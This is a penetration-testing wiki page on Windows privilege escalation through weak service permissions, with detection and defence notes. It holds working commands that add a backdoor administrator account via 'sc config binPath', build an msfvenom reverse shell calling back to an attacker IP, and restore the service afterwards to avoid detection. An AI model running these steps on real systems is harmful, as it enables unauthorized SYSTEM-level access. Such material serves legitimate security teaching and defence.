---
title: Weak service permissions
slug: weak-service-permissions
---

> **TL;DR:** A Windows service whose DACL grants non-admins `SERVICE_CHANGE_CONFIG` (or `SERVICE_ALL_ACCESS`) lets you rewrite `binPath` to your payload, restart the service, and inherit its token — usually LocalSystem.

## What it is
Every Windows service has its own DACL controlling who can query, start, stop, and reconfigure it, independent of the file-system ACL on the binary. Vendors who call `SetServiceObjectSecurity` carelessly — or who grant `Authenticated Users` write access "to make support easier" — create services where a low-priv user can `sc config <svc> binPath= ...` to point at an attacker binary, then restart the service to execute it as the configured `obj=` (defaulting to LocalSystem).

## Preconditions / where it applies
- A user account that has `SERVICE_CHANGE_CONFIG` (`WP` in SDDL) or `SERVICE_ALL_ACCESS` (`SA`/`GA`) on a service.
- The service runs as a higher-priv principal (LocalSystem, NetworkService with extra rights, or a domain account with delegated permissions).
- You can start/stop the service yourself (`SERVICE_START` / `SERVICE_STOP`) or wait for it to be restarted (reboot, manual restart by an admin).
- Common on legacy line-of-business apps and on hosts where `subinacl /service * /grant=users=F` has been run "to fix a problem".

## Technique
1. Enumerate. Use `accesschk64.exe -uwcqv "Authenticated Users" *` (Sysinternals) to list every service the group can modify. Or query a single service's SDDL with `sc sdshow <svc>` and decode it — look for ACEs with `(A;;...WP...;;;AU)` or `(A;;...RPWPDTLO...;;;BU)`.

```cmd
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
sc sdshow Spooler
```

PowerSploit PowerUp's `Get-ModifiableService` + `Invoke-ServiceAbuse` automates the whole flow. winPEAS flags this under "Interesting services".

2. Stop the service if it is running and you have `STOP` rights:

```cmd
sc stop <svc>
```

3. Rewrite `binPath`. Note the SC quirk: there must be a space after the equals sign and the value should be quoted if it contains spaces. To add a local admin:

```cmd
sc config <svc> binPath= "cmd.exe /c net user pwn P@ss1! /add && net localgroup administrators pwn /add"
sc config <svc> obj= LocalSystem
```

For a callback shell use an `exe-service` payload as in [[unquoted-service-paths]]:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe-service -o svc.exe
```

```cmd
sc config <svc> binPath= "C:\Users\Public\svc.exe"
```

4. Start the service:

```cmd
sc start <svc>
```

The SCM launches your binary under the service's identity. With LocalSystem, you can dump LSASS, add domain admins (if the host is a DC), or pivot.

5. Restore the original `binPath` after operation to avoid breaking the host and tipping off ops.

If you only have `SERVICE_CHANGE_CONFIG` but not start/stop, you can change `binPath` and wait for the next reboot — or trigger a dependency restart through a service you can stop.

## Detection and defence
- Sysmon Event ID 4697 (Windows Security log) "A service was installed" and registry writes to `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` from non-admin processes are direct IOCs. Sigma rule `win_service_modification` covers this.
- Microsoft-Windows-Services-Svchost/Operational and `System` event log entries showing service starts of suspicious paths (`C:\Users\`, `C:\ProgramData\`) by SCM should alert.
- Defence: audit service DACLs (`sc sdshow`); never grant `Authenticated Users` or `Users` `WP`/`DC`/`WD` on services. Reset to defaults: `sc sdset <svc> "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)"`.
- Use group-managed service accounts (gMSA) with least privilege rather than LocalSystem where possible.
- Related: [[unquoted-service-paths]], [[dll-hijacking-privesc]], [[always-install-elevated]].

## References
- [HackTricks — Services Privesc](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html) — Enumeration and binPath rewrite cookbook.
- [Microsoft — Service Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) — Canonical access-mask reference.
- [PowerSploit PowerUp — Invoke-ServiceAbuse](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) — Automated weak-service-DACL exploitation.
- [Sysinternals AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) — Official tool for auditing service and object DACLs.
